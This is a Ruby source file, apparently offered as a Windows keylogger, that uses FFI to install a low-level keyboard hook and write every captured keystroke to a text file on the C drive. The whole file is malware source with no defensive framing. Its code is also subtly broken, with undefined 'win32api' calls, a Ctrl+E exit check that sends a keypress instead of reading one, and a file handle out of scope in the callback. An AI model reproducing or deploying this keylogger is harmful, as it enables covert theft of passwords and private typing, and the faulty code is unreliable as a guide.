require 'win32console'
require 'win32api'
require 'win32gui'
require 'rubygems'
require 'ffi'

module KeyLogger
  extend FFI::Library
  ffi_lib 'user32.dll'
  ffi_convention :stdcall

  WM_KEYDOWN = 0x0100
  WH_KEYBOARD_LL = 13

  class KBDLLHOOKSTRUCT < FFI::Struct
    layout :vk_code, :uint,
           :scan_code, :uint,
           :flags, :uint,
           :time, :uint,
           :dwExtraInfo, :ulong
  end

  # Hook callback function
  callback :keyboard_callback, [:int, :uint, :pointer], :long

  # SetWindowsHookEx function
  attach_function :set_hook, :SetWindowsHookExA, [:int, :keyboard_callback, :pointer, :ulong], :ulong

  # UnhookWindowsHookEx function
  attach_function :unhook, :UnhookWindowsHookEx, [:ulong], :bool

  # CallNextHookEx function
  attach_function :call_next_hook, :CallNextHookEx, [:ulong, :int, :uint, :pointer], :long

  # GetMessage function
  ffi_lib 'user32'
  attach_function :get_message, :GetMessageA, [:pointer, :ulong, :uint, :uint], :int
  attach_function :translate_message, :TranslateMessage, [:pointer], :bool
  attach_function :dispatch_message, :DispatchMessageA, [:pointer], :long

  # Open file for writing
  output_file = File.new("C:\\output.txt", "w")
  output_file.sync = true

  # Hook callback function implementation
  def self.keyboard_callback(nCode, wParam, lParam)
    if nCode >= 0 && wParam == WM_KEYDOWN
      struct = KBDLLHOOKSTRUCT.new(lParam)

      # Exit on Ctrl + E key combination
      if struct[:vk_code] == 69 && win32api.keybd_event(win32api.VK_CONTROL, 0, 0, 0)
        return 1
      end

      # Handle key event
      if struct[:vk_code] != 0 && struct[:vk_code] != 8 && struct[:vk_code] != 13
        chr = win32api.MapVirtualKey(struct[:vk_code], 2)
        output_file.puts "#{chr.chr}"
      end
    end

    # Pass control to the next hook in the chain
    call_next_hook(0, nCode, wParam, lParam)
  end

  # Set keyboard hook
  keyboard_hook = set_hook(WH_KEYBOARD_LL, method(:keyboard_callback), nil, 0)

  # Loop until the user presses Ctrl + E
  message = FFI::MemoryPointer.new(:int)
  while get_message(message, nil, 0, 0) != 0
    translate_message(message)
    dispatch_message(message)
  end

  # Unhook keyboard hook and close file
  unhook(keyboard_hook)
  output_file.close
end

KeyLogger

